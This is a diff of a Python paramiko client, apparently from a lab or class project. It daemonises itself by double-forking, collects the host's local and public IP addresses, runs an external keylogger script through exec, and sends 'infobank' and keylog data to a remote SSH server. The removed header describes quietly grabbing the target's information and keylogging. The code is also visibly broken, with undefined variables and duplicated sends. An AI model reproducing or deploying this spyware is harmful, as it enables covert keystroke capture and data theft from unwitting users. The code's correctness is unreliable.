@@ -17,17 +17,16 @@
  #
  #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
  #      
- #        Input:  Textual Input 
+ #        Input:  N/A
  #
- #       Output:  Friendly messages to the user
+ #       Output:  Outputs to console results of command executed
  #
- #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Ask user to voluntarily give up certain information.
- #                      Quietly grab the target user's computer information such as host and IP addresses. 
- #                      Double Fork and begin keylogging data. On a random interval, contact the server and report data logged       
- 
- #   Required Features Not Included: Optional features such as screenshots were not included due to time and COVID constraints.
+ #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Continously request new commands and then send them to the target client. Await for 
+ #               
+ #             
+ #   Required Features Not Included: N/A
  #
- #   Known Bugs:  N/A
+ #   Known Bugs:  N/A 
  #      
  #
  #   Classification: N/A
@@ -40,7 +39,7 @@ import re
 import socket #to capture the local IP
 import urllib.request # to capture the public ip
 import logzero
-import time # to randomize the contacting 
+import time
 from logzero import logger
 
 
@@ -111,19 +110,18 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
-def keylog():
-    #while True:
-        
-    #your code here
-    
+def keylog(filepath, globals=None, locals=None):
+    if globals is None:
+        globals = {}
+    globals.update({
+        "__file__": filepath,
+        "__name__": "__main__",
+    })
+    with open(filepath, 'rb') as file:
+        exec(compile(file.read(), filepath, 'exec'), globals, locals)
     return 0
     
-def connect(keyLoc):
-    '''
-    This function handles connecting to the server on the behalf of the caller
-    @param keyLoc - The file location of the RSA key
-    @return client Tunnel - The communications tunnel
-    '''
+def sendFile(dataFile,  keyLoc, filename):
     try:
         sftp = 0
         client = 0
@@ -138,7 +136,7 @@ def connect(keyLoc):
         client.connect(host,port, usr, pwd,  key)
         chan = client.get_transport().open_session()
 
-        return chan
+        
     except Exception as e:
         print("We ran into a problem and have to close. Please try again later.")
         print("Unhandled exception ->"+ str(e))
@@ -148,24 +146,15 @@ def connect(keyLoc):
             client.close()
         sys.exit(0)
     
-def sendFile(dataFile,  keyLoc, filename):
-    '''
-    This function contacts the daemon and sends the process information to it
-    It will connect and then close after completion
-    @param dataFile - The struct/data containing the information to be sent
-    @param keyLoc - The location to connect for RSA keys
-    @param fileName - The indicator of what data is to be sent
     
-    @returns int - Success
-    '''
-    chan = connect(keyLoc) #connect
     if filename == 'infobank.txt':
         print(filename)
         #send this filename
         strn = filename
         
         chan.sendall(strn.encode('utf-8'))
-        
+        #recieve a response for OK
+
         str = "|"
         #send the infobank data
         for indexes in dataFile:
@@ -176,21 +165,21 @@ def sendFile(dataFile,  keyLoc, filename):
         chan.sendall(str.encode('utf-8'))
     
     elif filename == 'keylog.txt':
-          #send this filename
         print(filename)
         strn = filename
+        
+        chan.sendall(strn.encode('utf-8'))
+        chan.sendall(strn.encode('utf-8'))
+        
+        #send this filename
+    
+        #recieve OK
 
-        chan.sendall(strn.encode('utf-8'))
-        
         #send the keylog data
-        #todo
-        chan.sendall(strn.encode('utf-8'))
-     
-        
     else:
         logger.error("Unknown fille handle sent to sendFile")
         
-    chan.close()
+    client.close()
     return 0
 def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     keyLoc = os.getcwd() # the key must be next to the client
@@ -205,6 +194,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
             sys.exit(0)
     except OSError as e:
         logger.error("Unable to fork for fork #1")
+        sftp.close()
         sys.exit(0)
                 
     os.chdir('/')
@@ -223,11 +213,10 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
         
     #I am the child connection, I am an evil fork and shouldn't HUP
    # Flush I/O  buffers  and lockdown stderr/out/in
+    keylog("/home/lab/sandbox/keylogger.py")
     sys.stdout.flush() 
     sys.stderr.flush()
-    
-    keylog()
-    
+ 
     sendFile("", keyLoc,  'keylog.txt')
     os._exit(0)
     
